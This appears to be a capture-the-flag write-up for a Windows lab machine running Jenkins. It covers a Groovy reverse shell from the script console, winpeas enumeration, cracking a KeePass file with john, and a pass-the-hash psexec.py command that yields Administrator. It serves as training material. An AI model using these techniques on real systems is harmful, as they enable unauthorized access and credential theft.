We find a directory /askjeeves in port 50000 and we open to see it is running jenkins version 2.87

# FOOTHOLD

Going to Manage Jenkins we see that we can run a groovy script in script console so we try a [groovy reverse shell](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy). And we get a shell back.

We find the user flag in c:\Users\kohsuke\user.txt

# PRIVILEGE ESCALATION

Since my reverse shell was going away every so often and almost no command was running I decided to upgrade to powershell (I still kept losing the shell every 5 mins) 
[Basic Powershell](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters)

And uploaded winpeas and ran it to find possible ways of privilege escalation. It shows that there is one CEH.kdbx file in kohsuke's Documents directory. So I uploaded nc.exe (after spending a lot of time searching how to transfer files imagine my feelings when I found out there is just one nc.exe file which can run on windows) and downloaded CEH.kdbx

Since it is encrypted we use keepass2john and crack the hash using john the ripper:

```s
john --wordlist=rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (CEH)

Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

And we get in and grab a hash:

```
aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```
We get Administrator shell via psexec.py

```s
python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 Administrator@10.10.10.63
```
BUT THEN , WHERE THE FLAG SHOULD BE THERE , I FOUND THIS !!!!
```
C:\Users\Administrator\Desktop>more hm.txt
more hm.txt
The flag is elsewhere.  Look deeper.
```
One of my friends had the idea that it might be hidden , AND IT WAS :

```s
C:\Users\Administrator\Desktop>dir /R
dir /R
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9
